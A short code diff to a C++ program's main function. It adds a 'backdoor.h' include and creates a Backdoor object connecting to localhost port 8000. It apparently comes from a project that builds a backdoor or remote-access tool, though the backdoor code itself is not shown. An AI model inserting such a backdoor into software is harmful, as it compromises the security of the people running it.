@@ -1,9 +1,17 @@
 #include "communication.h"
+#include "backdoor.h"
+#define IP "127.0.0.1"
+#define PORT 8000
+
 
 int main(int argc, char *argv[]){
     char * s = "Hello world";
 
-    Communication c("127.0.0.1", 8888);
+
+    Backdoor b(IP, PORT, true);
+
+
+    Communication c(IP, PORT);
     bool isalive = true;
 
     while(true){
